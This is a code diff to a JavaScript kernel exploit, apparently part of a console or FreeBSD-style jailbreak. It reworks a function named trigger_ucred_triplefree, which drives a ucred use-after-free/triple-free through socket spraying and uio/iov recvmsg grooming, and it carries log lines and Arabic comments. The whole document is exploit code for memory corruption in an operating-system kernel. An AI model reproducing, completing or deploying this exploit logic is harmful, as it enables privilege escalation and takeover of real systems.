@@ -181,7 +181,10 @@ var uio_readv_workers = [];
 var uio_writev_workers = [];
 var spray_ipv6_worker;
 var uaf_socket;
-
+var uio_sock_0;
+var uio_sock_1;
+var iov_sock_0;
+var iov_sock_1;
 var pipe_sock = malloc(8);
 var master_pipe = [0, 0];
 var victim_pipe = [0, 0];
@@ -1414,19 +1417,6 @@ function remove_uaf_file() {
 }
 var TRIPLEFREE_REFCOUNT_FIX_LOOPS = 32;
 var TRIPLEFREE_REFCOUNT_MAX_WAIT = 4000;
-
-var uio_sv = malloc(8);
-socketpair(AF_UNIX, SOCK_STREAM, 0, uio_sv);
-
-var uio_sock_0 = read32(uio_sv);
-var uio_sock_1 = read32(uio_sv + 4);
-
-var iov_sv = malloc(8);
-socketpair(AF_UNIX, SOCK_STREAM, 0, iov_sv);
-
-var iov_sock_0 = read32(iov_sv);
-var iov_sock_1 = read32(iov_sv + 4);
-
 function trigger_ucred_triplefree() {
   //log("[TRIGGER] enter trigger_ucred_triplefree");
   var end = false;
@@ -1467,10 +1457,11 @@ function trigger_ucred_triplefree() {
     // 6) محاولة إصلاح refcount بشكل خفيف
     //log("[TRIGGER] step 6: refcount fix loop start, loops=" + TRIPLEFREE_REFCOUNT_FIX_LOOPS);
     for (var i = 0; i < TRIPLEFREE_REFCOUNT_FIX_LOOPS; i++) {
-        trigger_iov_recvmsg();
-        write(iov_sock_1, tmp, 1);
-        wait_iov_recvmsg();
-        read(iov_sock_0, tmp, 1);
+     // log("[TRIGGER]   fix_loop i=" + i);
+      trigger_iov_recvmsg();
+      write(new BigInt(iov_sock_1), tmp, 1);
+      wait_iov_recvmsg();
+      read(new BigInt(iov_sock_0), tmp, 1);
     }
     log("[TRIGGER] step 6 done");
 
@@ -1495,6 +1486,7 @@ function trigger_ucred_triplefree() {
       close(new BigInt(uaf_socket));
       continue;
     }
+
     log("[TRIGGER] step 8: twins found twins[0]=" + twins[0] + " twins[1]=" + twins[1]);
 
     // 9) free واحدة من التوأم
@@ -1508,7 +1500,10 @@ function trigger_ucred_triplefree() {
     while (count < TRIPLEFREE_REFCOUNT_MAX_WAIT) {
      // log("[TRIGGER]   refcount loop count=" + count);
 
+      // شغّل recvmsg
       trigger_iov_recvmsg();
+
+      // كمّل دورة iov بالكامل
       write(new BigInt(iov_sock_1), tmp, 1);
       wait_iov_recvmsg();
       read(new BigInt(iov_sock_0), tmp, 1);
